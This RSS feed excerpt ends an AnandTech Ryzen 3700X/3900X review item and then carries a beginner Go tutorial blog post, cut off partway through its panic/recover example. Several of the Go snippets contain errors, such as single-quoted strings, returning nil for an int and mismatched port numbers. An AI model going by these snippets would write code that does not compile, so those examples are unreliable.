&lt;td class=&quot;tlgrey&quot;&gt;TDP&lt;/td&gt;
&lt;td&gt;95 W&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;$329&lt;br/&gt;(cooler included)&lt;/td&gt;
&lt;td class=&quot;tlgrey&quot;&gt;Price (List)&lt;/td&gt;
&lt;td&gt;$385&lt;br/&gt;&lt;span&gt;​(no cooler)&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;The Ryzen 7 3700X is an interesting SKU. With only one populated CPU chiplet, the unit has half the available L3 cache versus the Ryzen 9 3900X. But it also has all the CPU cores within its one chiplet active. In theory this does mean that the CPU cores have less overall L3 cache available to them, as they have to share it with an additional core within their respective CCXs.&lt;/p&gt;
&lt;p&gt;With a 3.6GHz/4.4Ghz base/boost clock configuration, we expect the 3700X to outperform the previous generation 2700X in all scenarios. The competition here based on pricing is the Core i7-9700K. Intel again should have a single-threaded performance advantage thanks to its 500 MHz higher clocks – but we’ll have to see how both chips match up in daily workloads.&lt;/p&gt;
&lt;h2&gt;The Zen 2 µarch Overview: Read Our Dedicated Article&lt;/h2&gt;
&lt;p&gt;We’ve already posted a microarchitecture overview and analysis of the Zen 2 microarchitecture following our Tech Day briefings in June, so be sure to read the piece in preparation for further testing analysis in our review today:&lt;/p&gt;
&lt;h3&gt;Read: &lt;a href=&quot;https://www.anandtech.com/show/14525/amd-zen-2-microarchitecture-analysis-ryzen-3000-and-epyc-rome&quot;&gt;AMD Zen 2 Microarchitecture Analysis: Ryzen 3000 and EPYC Rome&lt;/a&gt;&lt;/h3&gt;

</description>
<pubDate>Sun, 07 Jul 2019 13:02:18 +0000</pubDate>
<dc:creator>neogodless</dc:creator>
<og:title>The AMD 3rd Gen Ryzen Deep Dive Review: 3700X and 3900X Raising The Bar</og:title>
<og:type>article</og:type>
<og:url>https://www.anandtech.com/show/14605/the-and-ryzen-3700x-3900x-review-raising-the-bar</og:url>
<og:image>https://images.anandtech.com/doci/14605/Ryzen9_3800X_Hand_575px_678x452.jpg</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.anandtech.com/show/14605/the-and-ryzen-3700x-3900x-review-raising-the-bar</dc:identifier>
</item>
<item>
<title>Learning Golang – From Zero to Hero</title>
<link>https://milapneupane.com.np/2019/07/06/learning-golang-from-zero-to-hero/</link>
<guid isPermaLink="true" >https://milapneupane.com.np/2019/07/06/learning-golang-from-zero-to-hero/</guid>
<description>&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;“Go is an open source programming language that makes it easy to build simple, reliable, and efficient software”.&lt;/p&gt;
&lt;cite&gt;&lt;em&gt;GoLang&lt;/em&gt;&lt;/cite&gt;&lt;/blockquote&gt;
&lt;p&gt;In many languages, there are many ways to solve a given problem. Programmers can spend a lot of time thinking about the best way to solve it. Golang, on the other hand, believes in fewer features — with only one right way to solve the problem.&lt;/p&gt;
&lt;p&gt;This saves developers time and makes the large codebase easy to maintain. There are no “expressive” features like maps and filters in Golang.&lt;/p&gt;
&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;“When you have features that add expressiveness it typically adds expense”&lt;/p&gt;
&lt;cite&gt;&lt;em&gt;Rob Pike&lt;/em&gt;&lt;/cite&gt;&lt;/blockquote&gt;
&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*AUiSG5Gqz8MzaGCvGpckGA.png&quot; alt=&quot;&quot;/&gt;Recently published new logo of golang: &lt;a rel=&quot;noreferrer noopener&quot; href=&quot;https://blog.golang.org/go-brand&quot; target=&quot;_blank&quot;&gt;https://blog.golang.org/go-brand&lt;/a&gt;
&lt;h3 id=&quot;getting-started&quot;&gt;Getting Started&lt;/h3&gt;
&lt;p&gt;Golang is made of packages. The package main tells the Golang compiler that the program is compiled as an executable, rather than a shared library. It is the entry point for an application. The main package is defined as:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main
&lt;/pre&gt;
&lt;p&gt;Let’s move ahead by writing a simple hello world example by creating a file &lt;code&gt;main.go&lt;/code&gt; in the Go lang workspace.&lt;/p&gt;
&lt;h4 id=&quot;workspace&quot;&gt;&lt;strong&gt;Workspace&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;A workspace in Go is defined by the environment variable&lt;code&gt;GOPATH&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Any code you write is to be written inside the workspace. Go will search for any packages inside the &lt;code&gt;GOPATH&lt;/code&gt; directory, or the &lt;code&gt;GOROOT&lt;/code&gt; directory, which is set by default when installing Go. &lt;code&gt;GOROOT&lt;/code&gt;is the path where the go is installed.&lt;/p&gt;
&lt;p&gt;Set &lt;code&gt;GOPATH&lt;/code&gt; to your desired directory. For now, let’s add it inside a folder &lt;code&gt;~/workspace&lt;/code&gt;.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
# export env
export GOPATH=~/workspace
# go inside the workspace directory
cd ~/workspace
&lt;/pre&gt;
&lt;p&gt;Create the file &lt;code&gt;main.go&lt;/code&gt; with the following code inside the workspace folder we just created.&lt;/p&gt;
&lt;h4 id=&quot;hello-world-&quot;&gt;Hello World!&lt;/h4&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
 &quot;fmt&quot;
)

func main(){
  fmt.Println(&quot;Hello World!&quot;)
}
&lt;/pre&gt;
&lt;p&gt;In the above example, &lt;code&gt;fmt&lt;/code&gt; is a built-in package in Go which implements functions for formatting I/O.&lt;/p&gt;
&lt;p&gt;We import a package in Go by using the &lt;code&gt;import&lt;/code&gt;keyword. &lt;code&gt;func main&lt;/code&gt; is the main entry point where the code gets executed.&lt;code&gt;Println&lt;/code&gt; is a function inside the package &lt;code&gt;fmt&lt;/code&gt; which prints “hello world” for us.&lt;/p&gt;
&lt;p&gt;Let’s see by running this file. There are two ways we can run a Go command. As we know, Go is a compiled language, so we first need to compile it before executing.&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;gt; go build main.go&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This creates a binary executable file &lt;code&gt;main&lt;/code&gt; which now we can run:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
&amp;gt; ./main 
# Hello World!
&lt;/pre&gt;
&lt;p&gt;There is another, simpler, way to run the program. The &lt;code&gt;go run&lt;/code&gt; command helps abstract the compilation step. You can simply run the following command to execute the program.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
go run main.go
# Hello World!
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note&lt;/em&gt;&lt;/strong&gt;&lt;em&gt;: To try out the code that is mentioned in this blog you can use &lt;a href=&quot;https://play.golang.org/&quot;&gt;https://play.golang.org&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;variables&quot;&gt;Variables&lt;/h3&gt;
&lt;p&gt;Variables in Go are declared explicitly. Go is a statically typed language. This means that the variable type is checked at the time of variable declaration. A variable can be declared as:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var a int
&lt;/pre&gt;
&lt;p&gt;In this case, the value will be set as 0. Use the following syntax to declare and initialize a variable with a different value:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var a = 1
&lt;/pre&gt;
&lt;p&gt;Here the variable is automatically assigned as an int. We can use a shorthand definition for the variable declaration as:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
message := &quot;hello world&quot;
&lt;/pre&gt;
&lt;p&gt;We can also declare multiple variables in the same line:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var b, c int = 2, 3
&lt;/pre&gt;
&lt;h3 id=&quot;data-types&quot;&gt;Data types&lt;/h3&gt;
&lt;p&gt;Like any other programming language, Golang supports various different data structures. Let’s explore some of them:&lt;/p&gt;
&lt;h4 id=&quot;number-string-and-boolean&quot;&gt;&lt;strong&gt;Number, String, and Boolean&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Some of the supportednumber store types are int, int8, int16, int32, int64,&lt;br/&gt;uint, uint8, uint16, uint32, uint64, uintptr…&lt;/p&gt;
&lt;p&gt;The string type stores a sequence of bytes. It is represented and declared with keyword &lt;code&gt;string&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Abooleanvalue is stored using the keyword &lt;code&gt;bool&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Golang also supports complex number type data types, which can be declared with &lt;code&gt;complex64&lt;/code&gt; and &lt;code&gt;complex128&lt;/code&gt;.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var a bool = true
var b int = 1
var c string = 'hello world'
var d float32 = 1.222
var x complex128 = cmplx.Sqrt(-5 + 12i)
&lt;/pre&gt;
&lt;h4 id=&quot;arrays-slices-and-maps&quot;&gt;&lt;strong&gt;Arrays, Slices, and Maps&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;An array is a sequence of elements of the same data type. Arrays have a fixed length defined at declaration, so it cannot be expanded more than that. An array is declared as:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var a [5]int
&lt;/pre&gt;
&lt;p&gt;Arrays can also be multidimensional. We can simply create them with the following format:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var multiD [2][3]int
&lt;/pre&gt;
&lt;p&gt;Arrays are limiting for cases when the values of array changes in runtime. Arrays also do not provide the ability to get a subarray. For this, Golang has a data type called slices.&lt;/p&gt;
&lt;p&gt;Slices store a sequence of elements and can be expanded at any time. Slice declaration is similar to array declaration — without the capacity defined:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var b []int
&lt;/pre&gt;
&lt;p&gt;This creates a slice with zero capacity and zero length. Slices can also be defined with capacity and length. We can use the following syntax for it:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
numbers := make([]int,5,10)
&lt;/pre&gt;
&lt;p&gt;Here, the slice has an initial length of 5 and has a capacity of 10.&lt;/p&gt;
&lt;p&gt;Slices are an abstraction to an array. Slices use an array as an underlying structure. A slice contains three components: capacity, length, and a pointer to the underlying array as shown in the diagram below:&lt;/p&gt;
&lt;img src=&quot;https://cdn-images-1.medium.com/max/800/1*P0lNCO0sQwIYHLEX_mfSOQ.png&quot; alt=&quot;&quot;/&gt;image src: &lt;a href=&quot;https://blog.golang.org/go-slices-usage-and-internals&quot; rel=&quot;noreferrer noopener&quot; target=&quot;_blank&quot;&gt;https://blog.golang.org/go-slices-usage-and-internals&lt;/a&gt;
&lt;p&gt;The capacity of a slice can be increased by using the append or a copy function. An append function adds value to the end of the array and also increases the capacity if needed.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
numbers = append(numbers, 1, 2, 3, 4)
&lt;/pre&gt;
&lt;p&gt;Another way to increase the capacity of a slice is to use the copyfunction. Simply create another slice with a larger capacity and copy the original slice to the newly created slice:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
// create a new slice
number2 := make([]int, 15)
// copy the original slice to new slice
copy(number2, number)
&lt;/pre&gt;
&lt;p&gt;We can create a sub-slice of a slice. This can be done simply using the following command:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
// initialize a slice with 4 len and values
number2 = []int{1,2,3,4}
fmt.Println(numbers) // -&amp;gt; [1 2 3 4]
// create sub slices
slice1 := number2[2:]
fmt.Println(slice1) // -&amp;gt; [3 4]
slice2 := number2[:3]
fmt.Println(slice2) // -&amp;gt; [1 2 3]
slice3 := number2[1:4]
fmt.Println(slice3) // -&amp;gt; [2 3 4]
&lt;/pre&gt;
&lt;p&gt;Maps are a data type in Go, which maps keys to values. We can define a map using the following command:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var m map[string]int
&lt;/pre&gt;
&lt;p&gt;Here &lt;code&gt;m&lt;/code&gt; is the new map variable, which has its keys as &lt;code&gt;string&lt;/code&gt; and values are &lt;code&gt;integers&lt;/code&gt;. We can add keys and values easily to a map:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
// adding key/value
m['clearity'] = 2
m['simplicity'] = 3
// printing the values
fmt.Println(m['clearity']) // -&amp;gt; 2
fmt.Println(m['simplicity']) // -&amp;gt; 3
&lt;/pre&gt;
&lt;h3 id=&quot;typecasting&quot;&gt;&lt;strong&gt;Typecasting&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;One type of data type can be converted into another using type casting. Let’s see a simple type conversion:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
a := 1.1
b := int(a)
fmt.Println(b)
//-&amp;gt; 1
&lt;/pre&gt;
&lt;p&gt;Not all types of data type can be converted to another type. Make sure that the data type is compatible with the conversion.&lt;/p&gt;
&lt;h3 id=&quot;conditional-statements&quot;&gt;Conditional Statements&lt;/h3&gt;
&lt;h4 id=&quot;if-else&quot;&gt;if else&lt;/h4&gt;
&lt;p&gt;For conditional statements, we can use if-else statements as shown in the example below. Make sure that the curly braces are in the same line as the condition is.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
if num := 9; num &amp;lt; 0 {
 fmt.Println(num, &quot;is negative&quot;)
} else if num &amp;lt; 10 {
 fmt.Println(num, &quot;has 1 digit&quot;)
} else {
 fmt.Println(num, &quot;has multiple digits&quot;)
}
&lt;/pre&gt;
&lt;h4 id=&quot;switch-case&quot;&gt;switch case&lt;/h4&gt;
&lt;p&gt;Switch cases helps organize multiple condition statements. The following example shows a simple switch case statement:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
i := 2
switch i {
case 1:
 fmt.Println(&quot;one&quot;)
case 2:
 fmt.Println(&quot;two&quot;)
default:
 fmt.Println(&quot;none&quot;)
}
&lt;/pre&gt;
&lt;h3 id=&quot;looping&quot;&gt;Looping&lt;/h3&gt;
&lt;p&gt;Golang has a single keyword for the loop. A sngle for loop command help achieve different kinds of loops:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
i := 0
sum := 0
for i &amp;lt; 10 {
 sum += 1
  i++
}
fmt.Println(sum)
&lt;/pre&gt;
&lt;p&gt;The above example is similar to a while loop in C. The same for statement can be used for a normal for loop:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
sum := 0
for i := 0; i &amp;lt; 10; i++ {
  sum += i
}
fmt.Println(sum)
&lt;/pre&gt;
&lt;p&gt;Infinite loop in Go:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
for {
}
&lt;/pre&gt;
&lt;h3 id=&quot;pointers&quot;&gt;Pointers&lt;/h3&gt;
&lt;p&gt;Golang provides pointers. Pointers are the place to hold the address of a value. A pointer is defined by *. A pointer is defined according to the type of data. Example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
var ap *int
&lt;/pre&gt;
&lt;p&gt;Here &lt;code&gt;ap&lt;/code&gt; is the pointer to an integer type. The &lt;code&gt;&amp;amp;&lt;/code&gt; operator can be used to get the address of a variable.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
a := 12
ap = &amp;amp;a
&lt;/pre&gt;
&lt;p&gt;The value pointed by the pointer can be accessed using the &lt;code&gt;*&lt;/code&gt; operator:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
fmt.Println(*ap)
// =&amp;gt; 12
&lt;/pre&gt;
&lt;p&gt;Pointers are usually preferred while passing a struct as an argument or while declaring a method for a defined type.&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;While passing value the value is actually copied which means more memory&lt;/li&gt;
&lt;li&gt;With the pointer passed, the value changed by the function is reflected back in the method/function caller.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
func increment(i *int) {
  *i++
}
func main() {
  i := 10
  increment(&amp;amp;i)
  fmt.Println(i)
}
//=&amp;gt; 11
&lt;/pre&gt;
&lt;p&gt;Note: While you are trying out the example code in the blog, do not forget to include it with package main and import fmt or other packages when needed as shown in the first main.go example above.&lt;/p&gt;
&lt;h3 id=&quot;functions&quot;&gt;Functions&lt;/h3&gt;
&lt;p&gt;The main function defined in the main package is the entry point for a golang program to execute. More functions can be defined and used. Let’s look into a simple example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
func add(a int, b int) int {
  c := a + b
  return c
}
func main() {
  fmt.Println(add(2, 1))
}
//=&amp;gt; 3
&lt;/pre&gt;
&lt;p&gt;As we can see in the above example, a Golang function is defined using the &lt;strong&gt;func &lt;/strong&gt;keyword followed by the function name. The &lt;strong&gt;arguments&lt;/strong&gt; a function takes needs to be defined according to its data type, and finally the data type of the return.&lt;/p&gt;
&lt;p&gt;The return of a function can be predefined in function as well:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
func add(a int, b int) (c int) {
  c = a + b
  return
}
func main() {
  fmt.Println(add(2, 1))
}
//=&amp;gt; 3
&lt;/pre&gt;
&lt;p&gt;Here c is defined as the return variable. So the variable c defined would be automatically returned without needing to be defined at the return statement at the end.&lt;/p&gt;
&lt;p&gt;You can also return multiple return values from a single function separating return values with a comma.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
func add(a int, b int) (int, string) {
  c := a + b
  return c, &quot;successfully added&quot;
}
func main() {
  sum, message := add(2, 1)
  fmt.Println(message)
  fmt.Println(sum)
}
&lt;/pre&gt;
&lt;h3 id=&quot;method-structs-and-interfaces&quot;&gt;Method, Structs, and Interfaces&lt;/h3&gt;
&lt;p&gt;Golang is not a completely object-oriented language, but with structs, interfaces, and methods it has a lot of object-oriented support and feel.&lt;/p&gt;
&lt;h4 id=&quot;struct&quot;&gt;Struct&lt;/h4&gt;
&lt;p&gt;A struct is a typed, collection of different fields. A struct is used to group data together. For example, if we want to group data of a Person type, we define a person’s attribute which could include name, age, gender. A struct can be defined using the following syntax:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
type person struct {
  name string
  age int
  gender string
}
&lt;/pre&gt;
&lt;p&gt;With a person type struct defined, now let’s create a person:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
//way 1: specifying attribute and value
p = person{name: &quot;Bob&quot;, age: 42, gender: &quot;Male&quot;}
//way 2: specifying only value
person{&quot;Bob&quot;, 42, &quot;Male&quot;}
&lt;/pre&gt;
&lt;p&gt;We can easily access these data with a dot(.)&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
p.name
//=&amp;gt; Bob
p.age
//=&amp;gt; 42
p.gender
//=&amp;gt; Male
&lt;/pre&gt;
&lt;p&gt;You can also access attributes of a struct directly with its pointer:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
pp = &amp;amp;person{name: &quot;Bob&quot;, age: 42, gender: &quot;Male&quot;}
pp.name
//=&amp;gt; Bob
&lt;/pre&gt;
&lt;h4 id=&quot;methods&quot;&gt;Methods&lt;/h4&gt;
&lt;p&gt;Methods are a special type of function with a &lt;em&gt;receiver. &lt;/em&gt;A receiver can be both a value or a pointer. Let’s create a method called describe which has a receiver type person we created in the above example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main
import &quot;fmt&quot;

// struct defination
type person struct {
  name   string
  age    int
  gender string
}

// method defination
func (p *person) describe() {
  fmt.Printf(&quot;%v is %v years old.&quot;, p.name, p.age)
}
func (p *person) setAge(age int) {
  p.age = age
}

func (p person) setName(name string) {
  p.name = name
}

func main() {
  pp := &amp;amp;person{name: &quot;Bob&quot;, age: 42, gender: &quot;Male&quot;}
  pp.describe()
  // =&amp;gt; Bob is 42 years old
  pp.setAge(45)
  fmt.Println(pp.age)
  //=&amp;gt; 45
  pp.setName(&quot;Hari&quot;)
  fmt.Println(pp.name)
  //=&amp;gt; Bob
}
&lt;/pre&gt;
&lt;p&gt;As we can see in the above example, the method now can be called using a dot operator as &lt;code&gt;pp.describe&lt;/code&gt;. Note that the receiver is a pointer. With the pointer we are passing a reference to the value, so if we make any changes in the method it will be reflected in the receiver pp. It also does not create a new copy of the object, which saves memory.&lt;/p&gt;
&lt;p&gt;Note that in the above example the value of age is changed, whereas the value of name is not changed because the method setName is of the receiver type whereas setAge is of type pointer.&lt;/p&gt;
&lt;h4 id=&quot;interfaces&quot;&gt;Interfaces&lt;/h4&gt;
&lt;p&gt;Golang interfaces are a collection of methods. Interfaces help group together the properties of a type. Let’s take the example of an interface animal:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
type animal interface {
  description() string
}
&lt;/pre&gt;
&lt;p&gt;Here animal is an interface type. Now let’s create 2 different type of animals which implement the animal interface type:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
  &quot;fmt&quot;
)

type animal interface {
  description() string
}

type cat struct {
  Type  string
  Sound string
}

type snake struct {
  Type      string
  Poisonous bool
}

func (s snake) description() string {
  return fmt.Sprintf(&quot;Poisonous: %v&quot;, s.Poisonous)
}

func (c cat) description() string {
  return fmt.Sprintf(&quot;Sound: %v&quot;, c.Sound)
}

func main() {
  var a animal
  a = snake{Poisonous: true}
  fmt.Println(a.description())
  a = cat{Sound: &quot;Meow!!!&quot;}
  fmt.Println(a.description())
}

//=&amp;gt; Poisonous: true
//=&amp;gt; Sound: Meow!!!
&lt;/pre&gt;
&lt;p&gt;In the main function, we create a variable &lt;code&gt;a&lt;/code&gt; of type animal. We assign a snake and a cat type to the animal and use Println to print a.description. Since we have implemented the method describe in both of the types (cat and snake) in a different way we get the description of the animal printed.&lt;/p&gt;
&lt;h3 id=&quot;packages&quot;&gt;Packages&lt;/h3&gt;
&lt;p&gt;We write all code in Golang in a package. The &lt;strong&gt;main &lt;/strong&gt;package is the entry point for the program execution. There are lots of built-in packages in Go. The most famous one we have been using is the &lt;strong&gt;fmt &lt;/strong&gt;package.&lt;/p&gt;
&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;“Go packages in the main mechanism for programming in the large that go provides and they make possible to divvy up a large project into smaller pieces.”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote class=&quot;wp-block-quote&quot;&gt;
&lt;p&gt;— Robert Griesemer&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;installing-a-package&quot;&gt;Installing a package&lt;/h4&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
go get 
// example
go get github.com/satori/go.uuid
&lt;/pre&gt;
&lt;p&gt;The packages we installed are saved inside the GOPATH env which is our work directory. You can see the packages by going inside the pkg folder inside our work directory &lt;code&gt;cd $GOPATH/pkg&lt;/code&gt;.&lt;/p&gt;
&lt;h4 id=&quot;creating-a-custom-package&quot;&gt;Creating a custom package&lt;/h4&gt;
&lt;p&gt;Let’s start by creating a folder custom_package:&lt;/p&gt;
&lt;pre class=&quot;wp-block-code&quot;&gt;
&lt;code&gt;&amp;gt; mkdir custom_package
&amp;gt; cd custom_package&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;To create a custom package we need to first create a folder with the package name we need. Let’s say we are building a package &lt;code&gt;person&lt;/code&gt;. For that let’s create a folder named &lt;code&gt;person&lt;/code&gt; inside &lt;code&gt;custom_package&lt;/code&gt; folder:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
&amp;gt; mkdir person
&amp;gt; cd person
&lt;/pre&gt;
&lt;p&gt;Now let’s create a file person.go inside this folder.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package person
func Description(name string) string {
  return &quot;The person name is: &quot; + name
}
func secretName(name string) string {
  return &quot;Do not share&quot;
}
&lt;/pre&gt;
&lt;p&gt;We now need to install the package so that it can be imported and used. So let’s install it:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
&amp;gt; go install
&lt;/pre&gt;
&lt;p&gt;Now let’s go back to the custom_package folder and create a main.go file&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main
import(
  &quot;custom_package/person&quot;
  &quot;fmt&quot;
)
func main(){ 
  p := person.Description(&quot;Milap&quot;)
  fmt.Println(p)
}
// =&amp;gt; The person name is: Milap
&lt;/pre&gt;
&lt;p&gt;Here we can now import the package &lt;code&gt;person&lt;/code&gt; we created and use the function Description. Note that the function &lt;code&gt;secretName&lt;/code&gt; we created in the package will not be accessible. In Go, the method name starting without a capital letter will be private.&lt;/p&gt;
&lt;h4 id=&quot;packages-documentation&quot;&gt;&lt;strong&gt;Packages Documentation&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Golang has built-in support for documentation for packages. Run the following command to generate documentation:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
godoc person Description
&lt;/pre&gt;
&lt;p&gt;This will generate documentation for the Description function inside our package person. To see the documentation run a web server using the following command:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
godoc -http=&quot;:8080&quot;
&lt;/pre&gt;
&lt;p&gt;Now go to the URL &lt;a href=&quot;http://localhost:6060/pkg/&quot;&gt;http://localhost:8080/pkg/&lt;/a&gt; and see the documentation of the package we just created.&lt;/p&gt;
&lt;h4 id=&quot;some-built-in-packages-in-go&quot;&gt;Some built-in packages in Go&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;fmt&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The package implements formatted I/O functions. We have already used the package for printing out to stdout.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;json&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Another useful package in Golang is the json package. This helps to encode/decode the JSON. Let’s take an example to encode/decode some json:&lt;/p&gt;
&lt;p&gt;Encode&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
  &quot;fmt&quot;
  &quot;encoding/json&quot;
)

func main(){
  mapA := map[string]int{&quot;apple&quot;: 5, &quot;lettuce&quot;: 7}
  mapB, _ := json.Marshal(mapA)
  fmt.Println(string(mapB))
}
&lt;/pre&gt;
&lt;p&gt;Decode&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
  &quot;fmt&quot;
  &quot;encoding/json&quot;
)

type response struct {
  PageNumber int `json:&quot;page&quot;`
  Fruits []string `json:&quot;fruits&quot;`
}

func main(){
  str := `{&quot;page&quot;: 1, &quot;fruits&quot;: [&quot;apple&quot;, &quot;peach&quot;]}`
  res := response{}
  json.Unmarshal([]byte(str), &amp;amp;res)
  fmt.Println(res.PageNumber)
}
//=&amp;gt; 1
&lt;/pre&gt;
&lt;p&gt;While decoding the json byte using unmarshal, the first argument is the json byte and the second argument is the address of the response type struct where we want the json to be mapped to. Note that the &lt;code&gt;json:”page”&lt;/code&gt; maps page key to PageNumber key in the struct.&lt;/p&gt;
&lt;h3 id=&quot;error-handling&quot;&gt;Error Handling&lt;/h3&gt;
&lt;p&gt;Errors are the undesired and unexpected result of a program. Let’s say we are making an API call to an external service. This API call may be successful or could fail. An error in a Golang program can be recognized when an error type is present. Let’s see the example:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
resp, err := http.Get(&quot;http://example.com/&quot;)
&lt;/pre&gt;
&lt;p&gt;Here the API call to the error object may pass or could fail. We can check if the error is nil or present and handle the response accordingly:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
package main

import (
  &quot;fmt&quot;
  &quot;net/http&quot;
)

func main(){
  resp, err := http.Get(&quot;http://example.com/&quot;)
  if err != nil {
    fmt.Println(err)
    return
  }
  fmt.Println(resp)
}
&lt;/pre&gt;
&lt;h4 id=&quot;returning-custom-error-from-a-function&quot;&gt;Returning custom error from a function&lt;/h4&gt;
&lt;p&gt;When we are writing a function of our own, there are cases when we have errors. These errors can be returned with the help of the error object:&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
func Increment(n int) (int, error) {
  if n &amp;lt; 0 {
    // return error object
    return nil, errors.New(&quot;math: cannot process negative number&quot;)
  }
  return (n + 1), nil
}
func main() {
  num := 5
 
  if inc, err := Increment(num); err != nil {
    fmt.Printf(&quot;Failed Number: %v, error message: %v&quot;, num, err)
  }else {
    fmt.Printf(&quot;Incremented Number: %v&quot;, inc)
  }
}
&lt;/pre&gt;
&lt;p&gt;Most of the packages that are built in Go, or external packages we use, have a mechanism for error handling. So any function we call could have possible errors. These errors should never be ignored and always handled gracefully in the place we call these functions, as we have done in the above example.&lt;/p&gt;
&lt;h4 id=&quot;panic&quot;&gt;Panic&lt;/h4&gt;
&lt;p&gt;Panic is something that is unhandled and is suddenly encountered during a program execution. In Go, panic is not the ideal way to handle exceptions in a program. It is recommended to use an error object instead. When a panic occurs, the program execution get’s halted. The thing that gets executed after a panic is the defer.&lt;/p&gt;
&lt;pre class=&quot;wp-block-preformatted&quot;&gt;
//Go
package main

import &quot;fmt&quot;

func main() {
    f()
    fmt.Println(&quot;Returned normally from f.&quot;)
}

func f() {
    defer func() {
        if r := recover(); r != nil {
            fmt.Println(&quot;Recovered in f&quot;, r)
        }
    }()
    fmt.Println(&quot;Calling g.&quot;)
    g(0)
    fmt.Println(&quot;Returned normally from g.&quot;)
}

func g(i int) {
    if i &amp;gt; 3 {
